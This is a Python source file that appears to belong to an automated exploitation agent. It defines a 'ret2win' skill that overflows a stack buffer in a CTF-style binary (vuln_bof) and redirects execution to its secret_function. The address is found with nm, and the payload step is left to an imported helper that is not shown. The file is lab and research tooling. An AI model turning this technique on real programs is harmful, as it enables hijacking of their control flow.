"""
ret2win.py — Skill: exploit a stack buffer overflow via ret2win.

Overwrites the saved return address on the stack to redirect execution
to a secret/win function. Requires the binary to have a known win function
symbol and no ASLR (no-PIE compile flag).

Target binary: vuln_bof (buffer[64] + saved RBP → 72-byte offset to RIP)

AUTHORIZED TESTING ONLY — for CTF and defensive security research.
"""

from __future__ import annotations

import os
from typing import Any

from core.skill_base import SkillBase
from tools.exploit_runner import find_symbol_address, run_ret2win, KNOWN_OFFSETS


class Ret2WinSkill(SkillBase):
    """Exploit a stack buffer overflow by redirecting execution to secret_function."""

    @property
    def name(self) -> str:
        return "ret2win"

    @property
    def description(self) -> str:
        return (
            "Exploit a stack buffer overflow vulnerability by overwriting the "
            "return address to jump to secret_function (ret2win technique). "
            "Automatically resolves the win function address via nm. "
            "Use on buffer_overflow binaries after gdb_debug confirms a crash."
        )

    @property
    def input_schema(self) -> dict:
        return {
            "binary_path": {
                "type": "str",
                "description": "Path to the vulnerable binary (e.g. targets/vuln_bof)",
            },
        }

    def execute(self, **kwargs) -> dict[str, Any]:
        errors = self.validate_inputs(**kwargs)
        if errors:
            return {"success": False, "data": None, "error": "; ".join(errors)}

        binary_path = kwargs["binary_path"]
        if not os.path.isfile(binary_path):
            return {"success": False, "data": None, "error": f"Binary not found: {binary_path}"}

        binary_name = os.path.basename(binary_path)
        offset = kwargs.get("offset", KNOWN_OFFSETS.get(binary_name, 72))

        win_addr = kwargs.get("win_addr") or find_symbol_address(binary_path, "secret_function")
        if win_addr is None:
            return {
                "success": False,
                "data": None,
                "error": "Could not resolve secret_function address — ensure nm is installed and binary is not stripped",
            }

        result = run_ret2win(binary_path, offset=offset, win_addr=win_addr)

        data = {
            "binary": binary_path,
            "vulnerability_class": "buffer_overflow",
            "offset_used": offset,
            "win_addr": hex(win_addr),
            **result,
        }
        return {"success": result["success"], "data": data, "error": result.get("error")}
